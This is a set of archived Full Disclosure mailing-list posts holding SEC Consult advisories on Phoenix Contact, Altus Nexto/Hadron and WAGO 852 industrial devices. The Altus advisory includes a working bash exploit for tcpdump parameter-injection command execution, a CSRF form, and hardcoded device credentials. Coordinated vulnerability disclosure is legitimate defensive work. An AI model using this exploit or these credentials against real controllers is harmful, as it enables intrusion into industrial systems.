2020-01-29: Sent advisory to vendor via PGP through psirt () phoenixcontact com;
            Vendor confirmed to receive the advisory.
2020-02-26: Vendor stated that the vulnerabilities were confirmed and that a
            firmware upgrade will be available in the next days.
2020-02-29: Asked vendor for further affected devices and firmware versions.
2020-03-02: Received information about further affected devices and firmware
            versions from vendor. The release of the new firmware version is
            planned for the end of the week. CVE numbers were requested by
            the vendor.
2020-03-05: Found new firmware version numbers on the vendor's website. Asked
            the vendor about the status regarding CVE numbers.
2020-03-05: Received CVE numbers.
2020-03-12: Coordinated release of security advisory.

Solution:
---------
Update the firmware of the affected devices to 1.03.18, 2.03.18 or 2.05.4.

The new versions can be downloaded from the firmware page:
<https://www.phoenixcontact.com/online/portal/us?1dmy&urile=wcm%3apath%3a/usen/web/main/service_and_support/application_pages/Firmware/Firmware>

Workaround:
-----------
Restrict network access to the device.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2020

```

**Attachment:
[smime.p7s](att-15/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](17)

### Current thread:

* [SEC Consult SA-20200312-0 :: Authenticated Command Injection in Phoenix Contact TC Router & TC Cloud Client](16) *SEC Consult Vulnerability Lab (Mar 13)*
  + **SEC Consult SA-20200312-0 :: Authenticated Command Injection in Phoenix Contact TC Router & TC Cloud Client** *SEC Consult Vulnerability Lab (Mar 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_ca41960b_20250125_072654.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20210819-0 :: Multiple critical vulnerabilities in Altus Nexto and Hadron series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 19 Aug 2021 11:16:21 +0200

---

```

SEC Consult Vulnerability Lab Security Advisory < 20210819-0 >
=======================================================================
              title: Multiple Critical Vulnerabilities
            product: Multiple Altus Sistemas de Automacao products:
                     Nexto NX30xx Series
                     Nexto NX5xxx Series
                     Nexto Xpress XP3xx Series
                     Hadron Xtorm HX3040 Series
 vulnerable version: See "Vulnerable / tested versions"
      fixed version: See "Solution"
         CVE number: CVE-2021-39243, CVE-2021-39243, CVE-2021-39243
             impact: Critical
           homepage: <https://www.altus.com.br/>
              found: 2020-05-20
                 by: D. Teuchert
                     T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos company
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"As a reference for the automation market for more than 35 years, Altus
Sistemas de Automação S.A. offers a complete line of products that meet a wide
range of customers’ needs in several areas of the domestic and international
markets. Developed with own technology, our solutions deliver high added value
to our customers businesses, enabling productivity, safety and reliability for
industrial automation applications and industrial automation processes.

We are a member of Parit Participações, a holding company in the technology
sector, which also controls Teikon S.A., a company with operations on the
electronic manufacturing market, and RT Tecnologia Médica, a company that
operates in the radiological market."

Source: <https://www.altus.com.br/sobre>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult recommends to perform a thorough security review of these
products conducted by security professionals to identify and resolve all
security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated Semi-Blind Command Injection via Parameter Injection (CVE-2021-39244)
The getlogs.cgi script allows authenticated users to start tcpdump on the
device. By injecting payloads into specific parameters it is also possible to
execute arbitrary OS commands. The output of these commands can be obtained in
another step.

2) Cross-Site Request Forgery (CSRF) (CVE-2021-39243)
The web interface that is used to set all configurations is vulnerable to
cross-site request forgery attacks. An attacker can change settings this way by
luring the victim to a malicious website.

3) Hardcoded Credentials for CGI Endpoint (CVE-2021-39245)
The getlogs.cgi script is exclusively htaccess-protected with hardcoded
credentials. These are shared with all firmware images from the series NX30xx,
HX30xx and XP3xx. These hardcoded credentials can be used to access the device
without a valid user account on application level and cannot be changed in the
user interface.

In combination with vulnerability 1), a full compromization on system level
with the only precondition of network access can be done.

4) Outdated and Vulnerable Software Components
A static scan with the IoT Inspector revealed outdated software packages that
are used in the devices' firmware.

The used BusyBox toolkit is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of the
discovered vulnerabilities (CVE-2017-16544) was verified by using the MEDUSA
scalable firmware runtime.

Proof of concept:
-----------------
1) Authenticated Semi-Blind Command Injection via Parameter Injection (CVE-2021-39244)
The following firmware extract of getlogs.cgi displays the vulnerability:
-------------------------------------------------------------------------------
TCPDUMP_IFACE=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_iface=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
TCPDUMP_COUNT=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_count=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
[...]
echo "tcpdump is running ..."
echo "<p>Please, wait the capture of $TCPDUMP_COUNT packets in $TCPDUMP_IFACE.</p>"
chrt -p -f 70 $$
tcpdump -i $TCPDUMP_IFACE -c $TCPDUMP_COUNT -w /tmp/capture.pcap
mount / -o rw,remount
ln -s /tmp/capture.pcap /usr/www/capture.pcap
mount / -o ro,remount
echo "<a href=\"capture.pcap\" download=\"$TCPDUMP_IFACE-capture.pcap\">Click here to download the capture file</a>"
-------------------------------------------------------------------------------
As it can be seen, the variables $TCPDUMP_COUNT and $TCPDUMP_IFACE are used
unfiltered in the tcpdump command. This means, that it is possible to inject
arbitrary parameters to the tcpdump command. The flag -z for tcpdump allows to
define a program that will run on the capture file. This behaviour can be used
to execute arbitrary commands. The following request injects parameters, so
that tcpdump listens on UDP port 1234 and will execute the capture file with
sh:
-------------------------------------------------------------------------------
GET /getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%201234
HTTP/1.1
Host: $IP
Authorization: Basic YWx0dXM6bmV4dG8xMjM0

-------------------------------------------------------------------------------
The next step to exploit this vulnerability is to send the commands to UDP port
1234:

$ echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT

The command is sent twice because it is possible, that the capture file
contains a "'" before the sent payload. Injecting the commands twice with a "'"
in between makes sure, that the command will be executed by sh and not
interpreted as a string. The output of the executed command is redirected to
the file capture.pcap which can be accessed via the following request:
-------------------------------------------------------------------------------
GET /capture.pcap HTTP/1.1
Host: $IP
-------------------------------------------------------------------------------
These three steps are combined in the following proof of concept script:
-------------------------------------------------------------------------------
#!/bin/bash
#Author: D. Teuchert
CMD="whoami"
if [[ $# -eq 1 ]]; then
    CMD=$1
fi
TARGET_HOST="192.168.100.123"
UDP_PORT=1234
BASIC_AUTH_USERNAME="altus"
BASIC_AUTH_PASSWORD="nexto1234"
BASIC_AUTH_HEADER=$(printf "$BASIC_AUTH_USERNAME:$BASIC_AUTH_PASSWORD" | base64)

#Sending HTTP request with parameter injection in tcpdump
#Break out of tcpdump is done via a technique described here:
#<https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/>
curl -s -k -X "GET" -H "Host: $TARGET_HOST" -H "Authorization: Basic $BASIC_AUTH_HEADER"
"<http://$TARGET_HOST/getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%20$UDP_PORT">;>/dev/null &
#Send udp packet with payload
echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT
echo -e "Executed \"$CMD\".\nResponse:"
#The output of the executed command was saved in capture.pcap
curl -s -k -X "GET" -H "Host: $TARGET_HOST" "[http://$TARGET_HOST/capture.pcap"](http://$TARGET_HOST/capture.pcap%22);
-------------------------------------------------------------------------------

2) Cross-Site Request Forgery (CSRF) (CVE-2021-39243)
The following CSRF proof-of-concept can be used to do the first step of the
command Injection exploitation:
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[http://$IP/getlogs.cgi"](http://$IP/getlogs.cgi%22);>
      <input type="hidden" name="logtype" value="tcpdump" />
      <input type="hidden" name="tcpdump_iface" value="eth0" />
      <input type="hidden" name="tcpdump_count" value="1 -G 1 -z sh -U -A udp port 1234" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

3) Hardcoded Credentials for CGI Endpoint (CVE-2021-39245)
The hardcoded credentials are present under "/etc/lighttpd/lighttpd-auth.conf":
altus:nexto1234

These credentials are exclusively used for the getlogs.cgi script. This is also
described in the lighttpd.conf which is located under the same directory:
-------------------------------------------------------------------------------
[...]
auth.debug = 0
auth.backend = "plain"
auth.backend.plain.userfile = "/etc/lighttpd/lighttpd-auth.conf"

auth.require = ( "/cgi/getlogs.cgi" =>
        (
                "method" => "basic",
                "realm" => "Password protected area",
                "require" => "user=altus"
        )
)
[...]
-------------------------------------------------------------------------------

4) Outdated and Vulnerable Software Components
Based on an automated scan with the IoT Inspector the following third party
software packages were found to be outdated:

Altus/Beijer XP3xx:
BusyBox         1.19.4
GNU glibc       2.19
lighttpd        1.4.30
Linux Kernel    4.9.98
OpenSSH         5.9p1
OpenSSL         1.0.0g
OpenSSL         1.1.1b (in CODESYS)
CODESYS Control 3.5.15

Altus/Beijer NX30xx:
BusyBox         1.1.3
Dropbear SSH    0.45
GNU glibc       2.5
lighttpd        1.4.24-devel-v1.0.0.7-1727-g6fd3998
Linux Kernel    2.6.23
OpenSSL         0.9.8g
OpenSSL         1.1.1b (in CODESYS)
CODESYS Control 3.5.15

Altus/Beijer HX30xx:
BusyBox         1.19.4
GNU glibc       2.11.1
lighttpd        1.4.30
Linux Kernel    3.0.75
OpenSSH         5.9p1
OpenSSL         1.0.0g
OpenSSL         1.0.2j (in CODESYS)
CODESYS Control 3.5.12.65

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
55\;test.txt
#
-------------------------------------------------------------------------------

The vulnerabilities 1), 2), 3), 4) were manually verified on an emulated device
by using the MEDUSA scalable firmware runtime.

Vulnerable / tested versions:
-----------------------------
The following firmware versions have been found to be vulnerable:
Altus/Beijer Nexto NX3003 / 1.8.11.0
Altus/Beijer Nexto NX3004 / 1.8.11.0
Altus/Beijer Nexto NX3005 / 1.8.11.0
Altus/Beijer Nexto NX3010 / 1.8.3.0
Altus/Beijer Nexto NX3020 / 1.8.3.0
Altus/Beijer Nexto NX3030 / 1.8.3.0
Altus/Beijer Nexto Xpress XP300 / 1.8.11.0
Altus/Beijer Nexto Xpress XP315 / 1.8.11.0
Altus/Beijer Nexto Xpress XP325 / 1.8.11.0
Altus/Beijer Nexto Xpress XP340 / 1.8.11.0
Altus/Beijer Hadron Xtorm HX3040 / 1.7.58.0

The following versions are also vulnerable according to the vendor:
Altus/Beijer Nexto NX5100 / 1.8.11.0
Altus/Beijer Nexto NX5101 / 1.8.11.0
Altus/Beijer Nexto NX5110 / 1.1.2.8
Altus/Beijer Nexto NX5210 / 1.1.2.8

Vendor contact timeline:
------------------------
2020-05-25: Contacting VDE CERT through info () cert vde com. Received
            confirmation from VDE CERT.
2020-05-01 - 2020-09-01: Multiple emails and telephone calls with VDE CERT.
            VDE CERT contacts said, that the vendor did not respond on any
            messages or calls.
2020-09-30: Wrote a message to the SVP R&D and Supply Chain of Beijer
            Electronics. No answer.
2020-10-05: Call with the helpdesk of Beijer Electronics AB. The contact stated
            that no case regarding vulnerabilities were opened and created one.
            The product owners of Westermo, Korenix and Beijer Electronics were
            informed via this inquiry. Set disclosure date to 2020-11-25.
2020-10-06: Restarted the whole responsible disclosure process by sending a
            request to the new security contact cs () beijerelectronics com.
2020-11-11: Asked the representatives of Korenix and Beijer regarding the
            status. No answer.
2020-11-25: Phone call with security manager of Beijer. Sent advisories via
            encrypted archive to cs () beijerelectronics com. Received
            confirmation of advisory receipt. Security manager told us that he
            can provide information regarding the time-line for the patches
            within the next two weeks.
2020-12-09: Asked for an update.
2020-12-18: Call with security manager of Beijer. Vendor presented initial
            analysis done by the affected companies, also Altus. Preliminary
            plans to fix the vulnerabilities were presented. Altus stated to
            fix issue #1 in January and the other vulnerabilities in March or
            April.
2021-03-21: Security manager invited SEC Consult to have a status meeting.
2021-03-25: Altus fixed vulnerability #1. Handover of the advisory handling to
            Altus employees will be done in April. Vendor released fixed
            firmware regarding issue #1.
2021-04-09: Meeting with Altus. Vendor did not agree with another potentially
            vulnerability, which was identified on the emulated device. Thus,
            it was removed from the advisory. Vulnerabilities #2 and #3 were
            planned to be fixed earlier this year but the releases shifted due
            to Covid. The new firmware version will be released in July 2021.
2021-04-22: Asked for an update; No answer.
2021-05-04: Asked for an update.
2021-05-07: Vendor was working on the security fixes.
2021-05-11: Vendor sent timeline for fixes and detailed version information.
            Two additional models were added to the affected devices by the
            vendor.
2021-06-10: Added additional information and asked if more time will be needed.
2021-06-10: Vendor added affected version numbers and asked for the 1st of
            August as new release date.
2021-06-15: Set the release date to 1st of August.
2021-07-28: Vendor sent the version numbers for the fixed firmware and asked
            for postponing the release to 6th of August for completing the
            documentation.
2021-08-16: Due to holiday, the SEC Consult Vulnerability was closed. Informed
            vendor to release the advisory in the next four days.
2021-08-17: Received CVE IDs.
2021-08-18: Informed vendor to release the advisory on 2021-08-19.
2021-08-19: Coordinated release of security advisory.

Solution:
---------
According to the vendor the following patches must be applied to fix issue 1),
2) and 3):

XP300 - v1.11.2.0
XP315 - v1.11.2.0
XP325 - v1.11.2.0
XP340 - v1.11.2.0
BCS-NX3003 - v1.11.2.0
BCS-NX3004 - v1.11.2.0
BCS-NX3005 - v1.11.2.0
BCS-NX3010 - v1.9.1.0
BCS-NX3020 - v1.9.1.0
BCS-NX3030 - v1.9.1.0
BCS-NX5100 - v1.11.2.0
BCS-NX5101 - v1.11.2.0
BCS-NX5110 - v1.11.2.0
BCS-NX5210 - v1.11.2.0
BCS-HX3040 - v1.11.2.0

Vendor's statement regarding issue 4):
"Altus continuously integrates new features and fixes in the products,
releasing new firmware versions. Often those improvements require the software
packages upgrading for several reasons, including security. When this happens,
we perform a set of tests to ensure that the performance, reliability, and
security were not negatively impacted by the upgrades. Although there are known
vulnerabilities in some software package versions, those vulnerabilities can
only be exploited if we compile those specific features and provide the means
to exploit them. The issue pointed out by SEC Consult, for instance, requires a
terminal to be exploited, which we don't provide in real hardware. Nowadays,
there isn't any known exploitable vulnerability caused by outdated software
packages in our products. Therefore, this item isn’t considered a vulnerability
by us."

Workaround:
-----------
Restrict network access to the device.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Daniel Teuchert, Thomas Weber / @2021

```

**Attachment:
[smime.p7s](att-21/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

### Current thread:

* **SEC Consult SA-20210819-0 :: Multiple critical vulnerabilities in Altus Nexto and Hadron series** *SEC Consult Vulnerability Lab (Aug 19)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_58889a8c_20250125_072650.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 13 Jun 2019 08:01:54 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190612-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: WAGO 852 Industrial Managed Switch Series
 vulnerable version: 852-303: <v1.2.2.S0
                     852-1305: <v1.1.6.S0
                     852-1505: <v1.1.5.S0
      fixed version: 852-303: v1.2.2.S0
                     852-1305: v1.1.6.S0
                     852-1505: v1.1.5.S0
         CVE number: CVE-2019-12550, CVE-2019-12549
             impact: high
           homepage: <https://www.wago.com>
              found: 2019-03-08
                 by: T. Weber (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"New ideas are the driving force behind our success WAGO is a family-owned
company headquartered in Minden, Germany. Independently operating for three
generations, WAGO is the global leader of spring pressure electrical
interconnect and automation solutions. For more than 60 years, WAGO has
developed and produced innovative products for packaging, transportation,
process, industrial and building automation markets amongst others. Aside from
its innovations in spring pressure connection technology, WAGO has introduced
numerous innovations that have revolutionized industry. Further ground-breaking
inventions include: the WAGO-I/O-SYSTEM®, TOPJOB S® and WALL-NUTS®."

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:
-----------------------------
According to the vendor, the following versions are affected:
* 852-303: <v1.2.2.S0
* 852-1305: <v1.1.6.S0
* 852-1505: <v1.1.5.S0

Vendor contact timeline:
------------------------
2019-03-12: Contacting VDE CERT through info () cert vde com, received confirmation
2019-03-26: Asking for a status update, VDE CERT is still waiting for details
2019-03-28: VDE CERT requests information from WAGO again
2019-04-09: Asking for a status update
2019-04-11: VDE CERT: patched firmware release planned for end of May, requested
            postponement of advisory release
2019-04-16: VDE CERT: update regarding affected firmware versions
2019-04-24: Confirming advisory release for beginning of June
2019-05-20: Asking for a status update
2019-05-22: VDE CERT: no news from WAGO yet, 5th June release date
2019-05-29: Asking for a status update
2019-05-29: VDE CERT: detailed answer from WAGO, patches will be published
            on 7th June, SEC Consult proposes new advisory release date for
            12th June
2019-06-07: VDE CERT provides security advisory information from WAGO;
            WAGO releases security patches
2019-06-12: Coordinated release of security advisory

Solution:
---------
The vendor provides patches to their customers at their download page. The
following versions fix the issues:
* 852-303: v1.2.2.S0
* 852-1305: v1.1.6.S0
* 852-1505: v1.1.5.S0

According to the vendor, busybox and glibc have been updated and the embedded
private keys are being newly generated upon first boot and after a factory reset.
The root login via Telnet and SSH has been disabled and the admin account is
documented and can be changed by the customer.

Workaround:
-----------
Restrict network access to the device & SSH server.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
